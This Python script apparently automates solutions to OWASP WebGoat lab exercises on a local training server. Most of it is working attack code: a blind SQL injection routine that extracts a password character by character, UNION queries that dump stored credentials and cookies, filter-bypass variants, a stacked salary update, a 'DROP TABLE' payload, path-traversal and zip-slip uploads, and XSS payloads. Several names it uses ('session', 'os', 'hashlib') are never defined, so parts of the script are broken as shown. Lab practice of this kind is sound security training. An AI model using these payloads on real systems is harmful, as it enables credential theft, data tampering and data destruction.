# Import the necessary packages
import sys
import json
import requests
import urllib
import urllib3
from requests_toolbelt.multipart.encoder import MultipartEncoder


class SQLInjection:
    """Class for performing SQL injection attacks"""

    def __init__(self, url, cookie):
        """Initialize with the target URL and session cookie"""
        self.url = url
        self.cookie = cookie

    def sql_injection_advance_5(self, username, lesson):
        """Perform advanced SQL injection"""

        alphabet_index = 0
        alphabet = 'abcdefghijklmnopqrstuvwxyz'
        password_index = 0
        password = ''

        # Set up headers with the session cookie
        headers = {'Cookie': 'JSESSIONID=' + self.cookie}

        while True:
            # Prepare the SQL payload
            payload = f"{username}' AND substring(password,{password_index + 1},1)='{alphabet[alphabet_index]}"

            data = {
                'username_reg': payload,
                'email_reg': f'{username}@{username}.com',
                'password_reg': 'test123',
                'confirm_password_reg': 'test123'
            }

            # Send the PUT request
            r = requests.put(self.url + lesson, headers=headers, data=data)

            try:
                response = json.loads(r.text)
            except:
                print(
                    "Wrong JSESSIONID, find it by looking at your requests once logged in.")
                return

            # Check if the username already exists
            if "already exists please try to register with a different username" not in response['feedback']:
                alphabet_index += 1
                if alphabet_index > len(alphabet) - 1:
                    return password
            else:
                password += alphabet[alphabet_index]
                alphabet_index = 0
                password_index += 1

    def sql_injection_mitigation_10(self, lesson, prod_server_name, ip_last_octects):
        """Perform SQL injection mitigation"""

        index = 0

        # Set up headers with the session cookie
        headers = {'Cookie': 'JSESSIONID=' + self.cookie}

        while True:
            # Prepare the SQL payload
            payload = f"(CASE WHEN (SELECT ip FROM servers WHERE hostname='{prod_server_name}') LIKE '{index}.%' THEN id ELSE hostname END)"
            r = requests.get(self.url + lesson + payload, headers=headers)

            try:
                response = json.loads(r.text)
            except:
                print(
                    "Wrong JSESSIONID, find it by looking at your requests once logged in.")
                return

            if response[0]['id'] == '1':
                prod_server_ip = f"{index}.{ip_last_octects}"
                print(f"{prod_server_name} IP: {prod_server_ip}")
                return prod_server_ip
            else:
                index += 1
                if index > 255:
                    print("No IP found")
                    return

    def path_traversal_random_picture(self, lesson, payload, secret_file):
        """Fetch a picture using path traversal"""

        # Define headers for the HTTP request
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Length": "0",
            "Cookie": 'JSESSIONID=' + self.cookie
        }

        try:
            # Create a connection pool manager
            http = urllib3.PoolManager()
            # Send the GET request and retrieve the response
            response = http.request(
                'GET', self.url + lesson + payload + secret_file, headers=headers)
            # Process the response body
            result = response.data.decode('utf-8').split(',')

            return result

        except requests.exceptions.HTTPError as err:
            print(err.request.url)
            print(err)
            print(err.response.text)

    def reflected_xss(self, lesson, payload):
        """Fetch data using reflected XSS"""

        # Define headers for the HTTP request
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Length": "0",
            "X-XSS-Protection": "0",
            "Cookie": 'JSESSIONID=' + self.cookie
        }

        try:
            # Create a connection pool manager
            http = urllib3.PoolManager()
            # Send the GET request and retrieve the response
            response = http.request(
                'GET', self.url + lesson + payload, headers=headers)
            # Process the response body
            result = response.data.decode('utf-8').split(',')

            return result

        except requests.exceptions.HTTPError as err:
            print(err.request.url)
            print(err)
            print(err.response.text)

    def dom_based_xss(self, lesson, payloads):
        """Attempt a DOM-based XSS attack using a list of payloads"""

        # Define headers for the HTTP request
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Length": "0",
            "Cookie": 'JSESSIONID=' + self.cookie
        }

        try:
            vulnerable = False
            for payload in payloads:
                # Ensure safe characters in payload
                safe_payload = urllib.parse.quote(payload, safe="()<>'';")

                # Form the request url
                request_url = self.url + lesson + safe_payload

                # Send the GET request
                response = requests.get(request_url, headers=headers)

                print(f"URL: {request_url}")
                print("raw: ", response.raw._original_response.__dict__)
                print("headers: ", response.raw._original_response.headers.__dict__)
                print("message: ", response.raw._original_response.msg.__dict__)

                # Check if the payload is present in the response
                if safe_payload in response.text:
                    vulnerable = True
                    print(
                        f"Possible DOM-based XSS vulnerability found with payload: {safe_payload}")

            if not vulnerable:
                print("No DOM-based XSS vulnerability found using provided payloads.")
        except requests.exceptions.HTTPError as err:
            print(err.request.url)
            print(err)
            print(err.response.text)

def main():
    attack_url = "http://www.webgoat.local:8080/WebGoat/"
    webgoat_cookie = "g9c9zYw5DiFMarMnXQrMYSWfdcBS4meTBNMVoHFQ"
    
    sqlinjection = SQLInjection(attack_url, webgoat_cookie)
    
    session_sqlinjection = session(attack_url, webgoat_cookie)
    
    # What is SQL? Excercise
    query = "SELECT department FROM employees WHERE first_name='Bob';"
    payload = "query=" + urllib.parse.quote(query)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack2", payload)
    
    # Data Manipulation Language (DML) - Exercise
    query = "UPDATE employees SET department='Sales' WHERE first_name='Tobi';"
    payload = "query=" + urllib.parse.quote(query)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack3", payload)
    
    # Data Definition Language (DDL) - Exercise
    query = "ALTER TABLE employees ADD phone varchar(20)"
    payload = "query=" + urllib.parse.quote(query)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack4", payload)
    
    # Data Control Language (DCL) - Exercise
    query = "GRANT UPDATE ON grant_rights TO unauthorized_user WITH GRANT OPTION"
    payload = "query=" + urllib.parse.quote(query)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack5", payload)
    
    # Try It! String SQL injection - Exercise A
    account = "Smith'"
    operator = "or"
    injection = "'1' = '1"
    payload = "account=" + urllib.parse.quote(account) + "&" + "operator=" + urllib.parse.quote(operator) + "&" + "injection=" + urllib.parse.quote(injection)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/assignment5a", payload)

    # Try It! String SQL injection - Exercise B
    login_count = "0"
    userid = "'101' OR '1' = '1';"
    payload = "login_count=" + urllib.parse.quote(login_count) + "&" + "userid=" + urllib.parse.quote(userid)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/assignment5b", payload)
    
    # Compromising confidentiality with String SQL injection
    name = "Smith"
    auth_tan = "3SL99A' OR '1' = '1"
    payload = "name=" + urllib.parse.quote(name) + "&" + "auth_tan=" + urllib.parse.quote(auth_tan)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack8", payload)
    
    # Compromising Integrity with Query chaining
    name = "Smith"
    auth_tan = "3SL99A' OR '1' = '1"
    payload = "name=" + urllib.parse.quote(name) + "&" + "auth_tan=" + urllib.parse.quote(auth_tan)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack8", payload)
    
    #Compromising Integrity with Query chaining
    '''
    query = "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";
    
    USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN	PHONE
    32147	Paulina	    Travers	    Accounting	46000	P45JSI	    null
    34477	Abraham 	Holman	    Development	50000	UU2ALK	    null
    37648	John	    Smith	    Marketing	64350	3SL99A	    null
    89762	Tobi	    Barnett	    Sales	    77000	TA9LL1	    null
    96134	Bob	        Franco	    Marketing	83700	LO9S2V	    null
    '''

    name = "Smith"
    auth_tan = "3SL99A'; UPDATE employees SET salary='100000' WHERE auth_tan='3SL99A"
    payload = "name=" + urllib.parse.quote(name) + "&" + "auth_tan=" + urllib.parse.quote(auth_tan)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack9", payload)
    
    # Compromising Availability
    action_string = "'; DROP TABLE access_log; --"
    payload = "action_string=" + urllib.parse.quote(action_string)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjection/attack10", payload)
    
    # Try It! Pulling data from other tables
    userid_6a = "' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--"
    userid_6b = "passW0rD"
    payload = "userid_6a=" + urllib.parse.quote(userid_6a) + "&" + "userid_6b=" + urllib.parse.quote(userid_6b)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjectionAdvanced/attack6a", payload)
    
    # SQL Injection (advanced)
    username_login = "tom"
    password_login = sqlinjection.sql_injection_advance_5(username_login, 'SqlInjectionAdvanced/challenge')
    payload = "username_login=" + urllib.parse.quote(username_login) + "&" + "password_login=" + urllib.parse.quote(password_login)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjectionAdvanced/challenge_Login", payload)
    
    # Quiz
    question_0_solution = "Solution 4: A statement has got values instead of a prepared statement"
    question_1_solution = "Solution 3: ?"
    question_2_solution = "Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way."
    question_3_solution = "Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data."
    question_4_solution = "Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'."
    payload = "question_0_solution=" + urllib.parse.quote(question_0_solution) + "&" + \
              "question_1_solution=" + urllib.parse.quote(question_1_solution) + "&" + \
              "question_2_solution=" + urllib.parse.quote(question_2_solution) + "&" + \
              "question_3_solution=" + urllib.parse.quote(question_3_solution) + "&" + \
              "question_4_solution=" + urllib.parse.quote(question_4_solution)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjectionAdvanced/quiz", payload)

    # Try it! Writing safe code - Attack 10a
    field1 = "getConnection"
    field2 = "PreparedStatement+statement"
    field3 = "prepareStatement"
    field4 = "?"
    field5 = "?"
    field6 = "statement.setString(1,+\"webgoat\");"
    field7 = "statement.setString(2,+\"webgoat@owasp.org\");"
    payload = "field1=" + urllib.parse.quote(field1) + "&" + \
              "field2=" + urllib.parse.quote(field2) + "&" + \
              "field3=" + urllib.parse.quote(field3) + "&" + \
              "field4=" + urllib.parse.quote(field4) + "&" + \
              "field5=" + urllib.parse.quote(field5) + "&" + \
              "field6=" + urllib.parse.quote(field6) + "&" + \
              "field7=" + urllib.parse.quote(field7)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjectionMitigations/attack10a", payload)
    
    # Try it! Writing safe code - Attack 10b
    editor = '''
        String user = "webgoat";
        String email = "webgoat@webgoat.org";
        try { 
            Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
            PreparedStatement prepared_statement = conn.prepareStatement("SELECT * FROM users WHERE name = ? AND email = ?");
            prepared_statement.setString(1, user);
            prepared_statement.setString(2, email);
            ResultSet results = prepared_statement.executeQuery();
            System.out.println(results.next());
        } catch (Exception e) {
            System.out.println("Oops. Something went wrong!");
        }
    '''
    payload = "editor=" + urllib.parse.quote(editor)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjectionMitigations/attack10b", payload)
    
    # Input validation alone is not enough!! - Exercise A
    userid_sql_only_input_validation = "'/**/UNION/**/SELECT/**/1,/**/user_name,/**/password,/**/cookie,/**/'A',/**/'B',/**/1/**/from/**/user_system_data;--"
    payload = "userid_sql_only_input_validation=" + urllib.parse.quote(userid_sql_only_input_validation)
    session_sqlinjection.post_payload_lesson_challenge("SqlOnlyInputValidation/attack", payload)
    
    # Input validation alone is not enough!! - Exercise B
    # userid_sql_only_input_validation_on_keywords = "'/**/UNUNIONION/**/SESELECTLECT/**/1,/**/user_name,/**/password,/**/cookie,/**/'A',/**/'B',/**/1/**/frfromom/**/user_system_data;--"
    userid_sql_only_input_validation_on_keywords = "';/**/SEselectLECT/**/*/**/FRfromOM/**/user_system_data;--"
    payload = "userid_sql_only_input_validation_on_keywords=" + urllib.parse.quote(userid_sql_only_input_validation_on_keywords)
    session_sqlinjection.post_payload_lesson_challenge("SqlOnlyInputValidationOnKeywords/attack", payload)
    
    # SQL Injection (mitigation) - Find IP Address
    ip = sqlinjection.sql_injection_mitigation_10("SqlInjectionMitigations/servers?column=", "webgoat-prd", "130.219.202")
    payload = "ip=" + urllib.parse.quote(ip)
    session_sqlinjection.post_payload_lesson_challenge("SqlInjectionMitigations/attack12a", payload)
    
    '''=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-= Path Traversal =-=-=--=-=-=-=-=-=-=-=-=-=-==-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-='''
    # Path traversal while uploading files
    image = "~/Downloads/ninja-avatar-jpg.jpg"
    _, fileName = os.path.split(image)
    multipart_data = MultipartEncoder(
        fields={
                "uploadId": "0:2d7765623034:557915d737b48:000456",
                "mtype": "1000",
                "extensions": "png,gif",
                "minPixSize": "1000",
                "maxBytesSize": "1000",
                "masterSize": "",
                "masterWidth": "",
                "masterHeight": "",
                "uploadedFile": (
                    fileName,
                    open(os.path.expanduser(image), 'rb'),
                    "image/jpeg"
                ),
                "fullName": "../test",
                "email": "test@test.org",
                "password": "test"
        }
    )
    session_sqlinjection.post_payload_lesson_challenge("PathTraversal/profile-upload", multipart_data, multipart_data.content_type)
    
    # Path traversal while uploading files - Upload file fix
    image = "~/Downloads/ninja-avatar-jpg.jpg"
    _, fileName = os.path.split(image)
    multipart_data = MultipartEncoder(
        fields={
                "uploadId": "0:2d7765623034:557915d737b48:000456",
                "mtype": "1000",
                "extensions": "png,gif",
                "minPixSize": "1000",
                "maxBytesSize": "1000",
                "masterSize": "",
                "masterWidth": "",
                "masterHeight": "",
                "uploadedFileFix": (
                    fileName,
                    open(os.path.expanduser(image), 'rb'),
                    "image/jpeg"
                ),
                "fullNameFix": "..././test",
                "emailFix": "test@test.org",
                "passwordFix": "test"
        }
    )
    session_sqlinjection.post_payload_lesson_challenge("PathTraversal/profile-upload-fix", multipart_data, multipart_data.content_type)
    
    # Path traversal while uploading files - Upload file fix - Rwemove User Input
    image = "~/Downloads/ninja-avatar-jpg.jpg"
    _, fileName = os.path.split(image)
    multipart_data = MultipartEncoder(
        fields={
                "uploadId": "0:2d7765623034:557915d737b48:000456",
                "mtype": "1000",
                "extensions": "png,gif",
                "minPixSize": "1000",
                "maxBytesSize": "1000",
                "masterSize": "",
                "masterWidth": "",
                "masterHeight": "",
                "uploadedFileRemoveUserInput": (
                    f"../{fileName}",
                    open(os.path.expanduser(image), 'rb'),
                    "image/jpeg"
                ),
                "fullName": "test",
                "email": "test@test.org",
                "password": "test"
        }
    )
    session_sqlinjection.post_payload_lesson_challenge("PathTraversal/profile-upload-remove-user-input", multipart_data, multipart_data.content_type)
    
    # Retrieving other files with a path traversal
    secret_file = "path-traversal-secret"
    encoded_path = ""
    path_traversal = b'../../'
    for character in path_traversal:
        encoded_path += "%{0:02x}".format(character)
    encoded_payload = urllib.parse.quote("?id=", safe="?=") + encoded_path
    answer = sqlinjection.path_traversal_random_picture("PathTraversal/random-picture", encoded_payload, secret_file)
    print(answer)
    hasher = hashlib.sha512()
    hasher.update('teuser'.encode('utf-8'))
    secret = hasher.hexdigest().lower()
    payload = "secret=" + urllib.parse.quote(secret)
    session_sqlinjection.post_payload_lesson_challenge("PathTraversal/random", payload)
    
    # Path traversal while uploading files -Zip Slip assignment
    image = "~/Downloads/ninja-avatar-jpg.zip"
    _, fileName = os.path.split(image)
    multipart_data = MultipartEncoder(
        fields={
                "uploadId": "0:2d7765623034:557915d737b48:000456",
                "mtype": "1000",
                "extensions": "png,gif",
                "minPixSize": "1000",
                "maxBytesSize": "1000",
                "masterSize": "",
                "masterWidth": "",
                "masterHeight": "",
                "uploadedFileZipSlip": (
                    fileName,
                    open(os.path.expanduser(image), 'rb'),
                    "image/jpeg"
                ),
                "fullName": "../test",
                "email": "test@test.org",
                "password": "test"
        }
    )
    session_sqlinjection.post_payload_lesson_challenge("PathTraversal/zip-slip", multipart_data, multipart_data.content_type)
    
    '''=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-= Cross Site Scripting =-=-=--=-=-=-=-=-=-=-=-=-=-==-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-='''
    # What is XSS?
    checkboxAttack1 = "on"
    payload = "checkboxAttack1=" + urllib.parse.quote(checkboxAttack1)
    session_sqlinjection.post_payload_lesson_challenge("CrossSiteScripting/attack1", payload)
    
    # Try It! Reflected XSS
    qty1 = "1"
    qty2 = "1"
    qty3 = "1"
    qty4 = "1"
    field1 = "<script>alert('XSS');</script>"
    field2 = "111"
    payload = urllib.parse.quote("?", safe='?') + \
              "QTY1=" + urllib.parse.quote(qty1) + "&" + \
              "QTY2=" + urllib.parse.quote(qty2) + "&" + \
              "QTY3=" + urllib.parse.quote(qty3) + "&" + \
              "QTY4=" + urllib.parse.quote(qty4) + "&" + \
              "field1=" + urllib.parse.quote(field1, safe='()') + "&" + \
              "field2=" + urllib.parse.quote(field2)
              
    response = sqlinjection.reflected_xss("CrossSiteScripting/attack5a", payload)
    response_string = ''
    for res in response:
        if '}' not in res:
            response_string += res + ','
        else:
            response_string += res
            
    user_response = json.loads(response_string.lower())
    user_response_formatted = json.dumps(user_response, indent=2)
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print("[+] SUCCESSFULY passed {} lesson challenge payload.".format(payload))
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    print(user_response_formatted)
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    
    # Identify potential for DOM-Based XSS
    domTestRoute = "start.mvc#test/"
    payload = "DOMTestRoute=" + urllib.parse.quote(domTestRoute)
    session_sqlinjection.post_payload_lesson_challenge("CrossSiteScripting/attack6a", payload)
    
    # Try It! DOM-Based XSS
    domTestRoute = "start.mvc#test/"
    # phoneHome = "<script>webgoat.customjs.phoneHome()</script>"
    # payload = urllib.parse.quote(phoneHome, safe="()<>")
    payloads = [
        "<script>alert('XSS');</script>",
        "<script>webgoat.customjs.phoneHome()</script>",
        "<img src='x' onerror='alert(1);'>",
        "<svg onload='alert(1)'>",
        "javascript:alert(1)"
    ]
    print(sqlinjection.dom_based_xss(domTestRoute, payloads))
    
    # Cross Site Scripting - Questions
    question_0_solution = "Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious."
    question_1_solution = "Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content."
    question_2_solution = "Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server."
    question_3_solution = "Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request."
    question_4_solution = "Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser executes."
    payload = "question_0_solution=" + urllib.parse.quote(question_0_solution) + "&" \
              "question_1_solution=" + urllib.parse.quote(question_1_solution) + "&" \
              "question_2_solution=" + urllib.parse.quote(question_2_solution) + "&" \
              "question_3_solution=" + urllib.parse.quote(question_3_solution) + "&" \
              "question_4_solution=" + urllib.parse.quote(question_4_solution)
    session_sqlinjection.post_payload_lesson_challenge("CrossSiteScripting/quiz", payload)
    
if __name__ == "__main__":
    main()
